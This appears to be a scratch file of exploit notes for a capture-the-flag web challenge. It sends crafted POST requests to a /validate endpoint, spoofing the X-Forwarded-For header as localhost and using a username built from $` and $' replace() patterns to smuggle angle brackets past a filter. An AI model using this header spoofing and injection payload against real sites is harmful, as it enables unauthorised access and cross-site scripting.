# https://www.youtube.com/watch?v=4tZLGP6QQBk&list=PLd0IGoiDwc6LrnF22cXAmx6oaRzB7K3db&index=33
# https://security.stackexchange.com/questions/197532/how-can-i-exploit-a-xss-vulnerability-which-doesnt-allow-me-to-type-and-sym
# https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#Specifying_a_string_as_a_parameter


"""
x = await fetch("http://localhost:3000/validate", {
  "headers": {
    "content-type": "application/json",
    "x-forwarded-for": "localhost",
    "Referer": "http://localhost:3000/",
  },
  "body": "{\"moveHistory\": [{\"dir\":1,\"x\":3,\"y\":6},{\"dir\":1,\"x\":4,\"y\":7},{\"dir\":1,\"x\":5,\"y\":7},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":7,\"y\":7},{\"dir\":1,\"x\":8,\"y\":7},{\"dir\":-1,\"x\":10,\"y\":6},{\"dir\":-1,\"x\":11,\"y\":5},{\"dir\":-1,\"x\":9,\"y\":6},{\"dir\":-1,\"x\":9,\"y\":7},{\"dir\":-1,\"x\":8,\"y\":6},{\"dir\":-1,\"x\":8,\"y\":7},{\"dir\":-1,\"x\":7,\"y\":6},{\"dir\":-1,\"x\":7,\"y\":7},{\"dir\":-1,\"x\":6,\"y\":6},{\"dir\":-1,\"x\":6,\"y\":7},{\"dir\":-1,\"x\":5,\"y\":6},{\"dir\":-1,\"x\":5,\"y\":7},{\"dir\":-1,\"x\":4,\"y\":6},{\"dir\":1,\"x\":2,\"y\":5},{\"dir\":1,\"x\":3,\"y\":5},{\"dir\":1,\"x\":3,\"y\":6},{\"dir\":1,\"x\":4,\"y\":5},{\"dir\":1,\"x\":4,\"y\":7},{\"dir\":1,\"x\":4,\"y\":6},{\"dir\":1,\"x\":5,\"y\":5},{\"dir\":1,\"x\":5,\"y\":7},{\"dir\":1,\"x\":5,\"y\":6},{\"dir\":1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":6,\"y\":6},{\"dir\":1,\"x\":7,\"y\":5},{\"dir\":-1,\"x\":7,\"y\":6},{\"dir\":-1,\"x\":7,\"y\":7},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":6,\"y\":6},{\"dir\":-1,\"x\":8,\"y\":2},{\"dir\":-1,\"x\":7,\"y\":5},{\"dir\":-1,\"x\":7,\"y\":7},{\"dir\":-1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":5,\"y\":2},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":7,\"y\":6}], \"username\": \"$`$`admin$'$'\"}",
  "method": "POST"
});
data = await x.text();
data;

function filter(x) {
    const inputstring = x.replace(/[<]/g, '%lt').replace(/[>]/g, '%gt');
    const userTemplate = '<{username}>';
    return userTemplate.replace("{username}", inputstring);
}
filter("admin")




x = await fetch("/validate", {
  "headers": {
    "content-type": "application/json",
    "x-forwarded-for": "localhost"
  },
  "body": "{\"moveHistory\":[{\"dir\":1,\"x\":3,\"y\":6},{\"dir\":1,\"x\":4,\"y\":7},{\"dir\":1,\"x\":5,\"y\":7},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":7,\"y\":7},{\"dir\":1,\"x\":8,\"y\":7},{\"dir\":-1,\"x\":10,\"y\":6},{\"dir\":-1,\"x\":11,\"y\":5},{\"dir\":-1,\"x\":9,\"y\":6},{\"dir\":-1,\"x\":9,\"y\":7},{\"dir\":-1,\"x\":8,\"y\":6},{\"dir\":-1,\"x\":8,\"y\":7},{\"dir\":-1,\"x\":7,\"y\":6},{\"dir\":-1,\"x\":7,\"y\":7},{\"dir\":-1,\"x\":6,\"y\":6},{\"dir\":-1,\"x\":6,\"y\":7},{\"dir\":-1,\"x\":5,\"y\":6},{\"dir\":-1,\"x\":5,\"y\":7},{\"dir\":-1,\"x\":4,\"y\":6},{\"dir\":1,\"x\":2,\"y\":5},{\"dir\":1,\"x\":3,\"y\":5},{\"dir\":1,\"x\":3,\"y\":6},{\"dir\":1,\"x\":4,\"y\":5},{\"dir\":1,\"x\":4,\"y\":7},{\"dir\":1,\"x\":4,\"y\":6},{\"dir\":1,\"x\":5,\"y\":5},{\"dir\":1,\"x\":5,\"y\":7},{\"dir\":1,\"x\":5,\"y\":6},{\"dir\":1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":6,\"y\":6},{\"dir\":1,\"x\":7,\"y\":5},{\"dir\":-1,\"x\":8,\"y\":2},{\"dir\":-1,\"x\":7,\"y\":5},{\"dir\":-1,\"x\":7,\"y\":7},{\"dir\":-1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":5,\"y\":2},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":7,\"y\":6}], \"username\": \"$`$`admin$'$'\"}",
  "method": "POST"
});
data = await x.text();
"""

fetch("https://jelly.ivan-and-keane-hard.work/validate", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-GB,en;q=0.7",
    "content-type": "application/json",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "sec-gpc": "1"
  },
  "referrer": "https://jelly.ivan-and-keane-hard.work/",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"moveHistory\":[{\"dir\":1,\"x\":3,\"y\":6},{\"dir\":1,\"x\":4,\"y\":7},{\"dir\":1,\"x\":5,\"y\":7},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":7,\"y\":7},{\"dir\":1,\"x\":8,\"y\":7},{\"dir\":-1,\"x\":10,\"y\":6},{\"dir\":-1,\"x\":11,\"y\":5},{\"dir\":-1,\"x\":9,\"y\":6},{\"dir\":-1,\"x\":9,\"y\":7},{\"dir\":-1,\"x\":8,\"y\":6},{\"dir\":-1,\"x\":8,\"y\":7},{\"dir\":-1,\"x\":7,\"y\":6},{\"dir\":-1,\"x\":7,\"y\":7},{\"dir\":-1,\"x\":6,\"y\":6},{\"dir\":-1,\"x\":6,\"y\":7},{\"dir\":-1,\"x\":5,\"y\":6},{\"dir\":-1,\"x\":5,\"y\":7},{\"dir\":-1,\"x\":4,\"y\":6},{\"dir\":1,\"x\":2,\"y\":5},{\"dir\":1,\"x\":3,\"y\":5},{\"dir\":1,\"x\":3,\"y\":6},{\"dir\":1,\"x\":4,\"y\":5},{\"dir\":1,\"x\":4,\"y\":7},{\"dir\":1,\"x\":4,\"y\":6},{\"dir\":1,\"x\":5,\"y\":5},{\"dir\":1,\"x\":5,\"y\":7},{\"dir\":1,\"x\":5,\"y\":6},{\"dir\":1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":6,\"y\":6},{\"dir\":1,\"x\":7,\"y\":5},{\"dir\":-1,\"x\":8,\"y\":2},{\"dir\":-1,\"x\":7,\"y\":5},{\"dir\":-1,\"x\":7,\"y\":7},{\"dir\":-1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":5,\"y\":2},{\"dir\":1,\"x\":6,\"y\":7},{\"dir\":1,\"x\":6,\"y\":5},{\"dir\":1,\"x\":7,\"y\":6}],\"username\":\"a\"}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});